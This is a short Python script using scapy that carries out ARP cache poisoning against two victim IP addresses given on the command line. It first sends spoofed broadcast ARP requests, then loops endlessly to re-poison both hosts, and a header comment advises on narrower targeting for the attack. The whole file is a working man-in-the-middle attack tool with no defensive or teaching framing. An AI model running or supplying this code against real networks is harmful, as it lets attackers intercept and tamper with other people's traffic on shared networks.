#!/usr/bin/env python3

import sys, time
from scapy.all import *

############################################################################################################################
# Though I made use of arp gratuitous messages during the attack, it should be used sparingly as every host on the network #
# will receive the message and update its arp cache accordingly. A better approach is to use arp replies that target the   #
# specific hosts you want to to attack.                                                                                    #
############################################################################################################################

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        usage()
        sys.exit(2)
        
    # unpack values
    victim_1 = sys.argv[1]
    victim_2 = sys.argv[2]
    
    # construct packet for initial poisoning via arp request
    sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_1, pdst = victim_2, op = 1), verbose = 0)
    sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_2, pdst = victim_1, op = 1), verbose = 0)
    print('Performed initial poisoning...')
    time.sleep(1.5)
    
    # ensure continuous poisoning via arp gratuitous messages
    while True:
        print('Re-arming arp poisoning...')
        sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_1, pdst = victim_1, op = 1), verbose = 0)
        sendp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(psrc = victim_2, pdst = victim_2, op = 1), verbose = 0)
        time.sleep(1.5)
    
def usage():
    print("Usage: ./arp-request.py <victim1-ip> <victim2-ip>\
    \n\tvictim1-ip: IP address of victim 1\
    \n\tvictim2-ip: IP address of victim 2\n")
    
    
if __name__ == '__main__':
    main()
